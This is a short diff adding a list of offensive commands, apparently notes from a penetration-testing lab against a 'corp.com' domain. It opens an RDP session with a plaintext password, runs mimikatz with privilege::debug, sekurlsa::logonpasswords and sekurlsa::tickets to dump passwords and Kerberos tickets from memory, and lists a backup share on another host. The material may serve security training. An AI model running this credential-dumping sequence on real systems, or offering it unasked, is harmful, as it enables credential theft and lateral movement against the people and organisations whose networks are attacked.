@@ -1,0 +1,14 @@
+xfreerdp /cert-ignore /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.50.75       
+
+cd C:\Tools
+
+.\mimikatz.exe
+
+privilege::debug
+
+sekurlsa::logonpasswords
+
+dir \\web04.corp.com\backup
+
+sekurlsa::tickets
+
